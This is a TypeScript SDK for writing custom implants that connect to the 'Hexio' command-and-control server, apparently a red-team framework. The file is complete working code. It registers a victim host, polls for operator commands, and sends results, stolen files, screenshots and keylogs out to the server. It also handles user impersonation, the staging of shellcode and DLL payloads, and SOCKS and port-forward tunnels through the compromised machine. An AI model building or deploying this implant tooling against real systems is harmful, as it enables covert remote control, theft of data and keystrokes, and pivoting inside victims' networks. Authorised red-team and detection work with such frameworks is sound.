// Hexio External Agent SDK for TypeScript / JavaScript.
//
// Works on Node 18+ (built-in fetch), Bun, Deno, and any modern browser.
// No runtime dependencies.

export interface RegisterRequest {
  hostname: string;
  ip: string;
  user: string;
  os: string;
  process: string;
  arch: string;
  pid: number;
  client_type: string;
  sleep_time?: number;
}

export interface RegisterResponse {
  agent_id: number;
  token: string;
}

export interface Command {
  id: number;
  command: string;
}

export interface CheckinResponse {
  commands: Command[];
  files?: unknown[];
}

export interface DownloadInitRequest {
  file_name: string;
  agent_path: string;
  file_size: number;
  chunk_size: number;
  total_chunks: number;
}

export interface DownloadInitResponse {
  download_id: string;
  agent_path: string;
}

export interface FileRequest {
  bof_files?: string[];
  pe_files?: string[];
  dll_files?: string[];
  elf_files?: string[];
  macho_files?: string[];
  shellcode_files?: string[];
  hexlang?: string[];
}

// --- Sync batch types ---

export interface SleepUpdate {
  sleep_time: number;
  sleep_jitter?: number;
}

export interface CommandResult {
  command_id: number;
  command: string;
  response: string;
}

export interface SideChannelResponse {
  channel_id: string;
  data: string;
}

export interface DownloadChunkUpload {
  download_id: string;
  chunk_data: string;
}

export interface ScreenshotUpload {
  filename: string;
  data: string;
}

export interface KeylogUpload {
  filename: string;
  data: string;
}

export interface SocksReceive {
  id: string;
  data: string;
}

export interface SocksSyncRequest {
  closes?: string[];
  receives?: SocksReceive[];
}

export interface SocksOpenEntry {
  id: string;
  addr: string;
  port: number;
  proto: string;
}

export interface SocksSend {
  id: string;
  data: string;
  size: number;
}

export interface SocksSyncResponse {
  opens?: SocksOpenEntry[];
  closes?: string[];
  send?: SocksSend[];
}

export interface PortFwdOpenRequest {
  port: number;
  remote_host: string;
  remote_port: number;
}

export interface PortFwdSend {
  sockid: string;
  data: string;
  size: number;
}

export interface PortFwdInboundData {
  opens?: string[];
  sends?: PortFwdSend[];
  closes?: string[];
}

export interface PortFwdSyncRequestEntry {
  port: number;
  data: PortFwdInboundData;
}

export interface PortFwdRecv {
  sockid: string;
  data: string;
  size: number;
}

export interface PortFwdOutboundData {
  recvs?: PortFwdRecv[];
  closes?: string[];
}

export interface PortFwdSyncResponseEntry {
  port: number;
  data: PortFwdOutboundData;
}

export interface SyncRequest {
  sleep?: SleepUpdate;
  impersonation?: string;
  commands?: CommandResult[];
  side_channel_responses?: SideChannelResponse[];
  download_init?: DownloadInitRequest[];
  download_chunk?: DownloadChunkUpload[];
  download_cancel?: string[];
  screenshots?: ScreenshotUpload[];
  keylog?: KeylogUpload;
  bof_files?: string[];
  pe_files?: string[];
  dll_files?: string[];
  elf_files?: string[];
  macho_files?: string[];
  shellcode_files?: string[];
  hexlang?: string[];
  /** Presence triggers open. Pass `{}`. */
  socks_open?: Record<string, never>;
  socks_open_port?: number;
  /** Presence triggers close. Pass `{}`. */
  socks_close?: Record<string, never>;
  socks_sync?: SocksSyncRequest;
  portfwd_open?: PortFwdOpenRequest[];
  portfwd_close?: number[];
  portfwd_sync?: PortFwdSyncRequestEntry[];
}

export interface DownloadChunkAck {
  download_id: string;
  chunk_received: boolean;
}

export interface PortFwdOpCloseResult {
  port: number;
  success: boolean;
}

export interface StagedFile {
  filename: string;
  filetype: string;
  alias: string;
  filedata: string;
}

export interface SyncResponse {
  commands: Command[];
  files?: StagedFile[];
  download_init?: DownloadInitResponse[];
  download_chunk?: DownloadChunkAck[];
  bof_files?: Record<string, string>;
  pe_files?: Record<string, string>;
  dll_files?: Record<string, string>;
  elf_files?: Record<string, string>;
  macho_files?: Record<string, string>;
  shellcode_files?: Record<string, string>;
  hexlang?: Record<string, string>;
  socks_open?: boolean;
  socks_port?: number;
  socks_close?: boolean;
  socks_sync?: SocksSyncResponse;
  portfwd_open?: PortFwdOpCloseResult[];
  portfwd_close?: PortFwdOpCloseResult[];
  portfwd_sync?: PortFwdSyncResponseEntry[];
}

export class HexioApiError extends Error {
  statusCode: number;
  constructor(statusCode: number, message: string) {
    super(`API error (${statusCode}): ${message}`);
    this.statusCode = statusCode;
    this.name = "HexioApiError";
  }
}

export interface HexioClientOptions {
  /** Override the fetch implementation (useful for custom agents / tests). */
  fetch?: typeof fetch;
  /** Request timeout in ms. Default: 30_000. */
  timeoutMs?: number;
}

export class HexioClient {
  baseUrl: string;
  passphrase: string;
  token: string | null = null;
  agentId: number | null = null;

  private readonly fetchImpl: typeof fetch;
  private readonly timeoutMs: number;

  constructor(baseUrl: string, passphrase: string, opts: HexioClientOptions = {}) {
    this.baseUrl = baseUrl.replace(/\/+$/, "");
    this.passphrase = passphrase;
    this.fetchImpl = opts.fetch ?? globalThis.fetch;
    this.timeoutMs = opts.timeoutMs ?? 30_000;
    if (!this.fetchImpl) {
      throw new Error("No fetch implementation available. Use Node 18+ or pass opts.fetch.");
    }
  }

  private async request<T = any>(method: string, path: string, body?: unknown): Promise<T> {
    const url = this.baseUrl + path;
    const headers: Record<string, string> = {
      HexioExternalAgentAuth: this.passphrase,
    };
    if (this.token) headers.HexioAgentToken = this.token;

    let payload: string | undefined;
    if (body !== undefined) {
      headers["Content-Type"] = "application/json";
      payload = JSON.stringify(body);
    }

    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), this.timeoutMs);

    let resp: Response;
    try {
      resp = await this.fetchImpl(url, {
        method,
        headers,
        body: payload,
        signal: controller.signal,
      });
    } finally {
      clearTimeout(timer);
    }

    const text = await resp.text();
    if (!resp.ok) {
      let message = text;
      try {
        const parsed = JSON.parse(text);
        if (parsed && typeof parsed.error === "string") message = parsed.error;
      } catch {}
      throw new HexioApiError(resp.status, message);
    }

    if (!text) return {} as T;
    return JSON.parse(text) as T;
  }

  // --- Registration ---

  async register(req: RegisterRequest): Promise<RegisterResponse> {
    const resp = await this.request<RegisterResponse>("POST", "/register", req);
    this.token = resp.token;
    this.agentId = resp.agent_id;
    return resp;
  }

  // --- Checkin / Sync ---

  checkin(): Promise<CheckinResponse> {
    return this.request<CheckinResponse>("GET", "/agent/checkin");
  }

  sync(req?: SyncRequest): Promise<SyncResponse> {
    return this.request<SyncResponse>("POST", "/agent/sync", req);
  }

  syncRaw(body: Record<string, any>): Promise<any> {
    return this.request("POST", "/agent/sync", body);
  }

  // --- Command Response ---

  commandResponse(commandId: number, command: string, response: string): Promise<any> {
    return this.request("POST", "/agent/command/response", {
      command_id: commandId,
      command,
      response,
    });
  }

  // --- Downloads ---

  downloadInit(req: DownloadInitRequest): Promise<DownloadInitResponse> {
    return this.request<DownloadInitResponse>("POST", "/agent/download/init", req);
  }

  downloadChunk(downloadId: string, chunk: Uint8Array): Promise<any> {
    return this.request("POST", "/agent/download/chunk", {
      download_id: downloadId,
      chunk_data: toBase64(chunk),
    });
  }

  downloadCancel(downloadId: string): Promise<any> {
    return this.request("POST", "/agent/download/cancel", { download_id: downloadId });
  }

  async downloadFile(filePath: string, data: Uint8Array, chunkSize = 65536): Promise<string> {
    const name = filePath.split(/[\\/]/).pop() ?? filePath;
    const cs = chunkSize < 1 ? 1 : chunkSize;
    const total = Math.ceil(data.length / cs);
    const init = await this.downloadInit({
      file_name: name,
      agent_path: filePath,
      file_size: data.length,
      chunk_size: cs,
      total_chunks: total,
    });
    for (let i = 0; i < total; i++) {
      await this.downloadChunk(init.download_id, data.subarray(i * cs, (i + 1) * cs));
    }
    return init.download_id;
  }

  // --- Screenshots / Keylogs ---

  screenshot(filename: string, imageData: Uint8Array): Promise<any> {
    return this.request("POST", "/agent/screenshot", {
      filename,
      data: toBase64(imageData),
    });
  }

  keylog(filename: string, data: string): Promise<any> {
    return this.request("POST", "/agent/keylog", { filename, data });
  }

  // --- Impersonation ---

  setImpersonation(user: string): Promise<any> {
    return this.request("POST", "/agent/impersonation", { user });
  }

  clearImpersonation(): Promise<any> {
    return this.setImpersonation("");
  }

  // --- Side Channel ---

  sidechannel(channelId: string, dataB64: string): Promise<any> {
    return this.request("POST", "/agent/sidechannel", {
      channel_id: channelId,
      data: dataB64,
    });
  }

  // --- File Requests ---

  requestFiles(req: FileRequest): Promise<any> {
    return this.request("POST", "/agent/files/request", req);
  }

  // --- SOCKS ---

  socksOpen(port?: number): Promise<any> {
    return this.request("POST", "/agent/socks/open", port !== undefined ? { port } : {});
  }

  socksClose(): Promise<any> {
    return this.request("POST", "/agent/socks/close", {});
  }

  socksSync(data: unknown): Promise<any> {
    return this.request("POST", "/agent/socks/sync", data);
  }

  // --- Port Forwarding ---

  portfwdOpen(port: number, remoteHost: string, remotePort: number): Promise<any> {
    return this.request("POST", "/agent/portfwd/open", {
      port,
      remote_host: remoteHost,
      remote_port: remotePort,
    });
  }

  portfwdClose(port: number): Promise<any> {
    return this.request("POST", "/agent/portfwd/close", { port });
  }

  portfwdSync(data: unknown): Promise<any> {
    return this.request("POST", "/agent/portfwd/sync", data);
  }
}

function toBase64(bytes: Uint8Array): string {
  if (typeof Buffer !== "undefined") {
    return Buffer.from(bytes).toString("base64");
  }
  let binary = "";
  for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
  // btoa is available in browsers and modern Deno/Bun
  return btoa(binary);
}
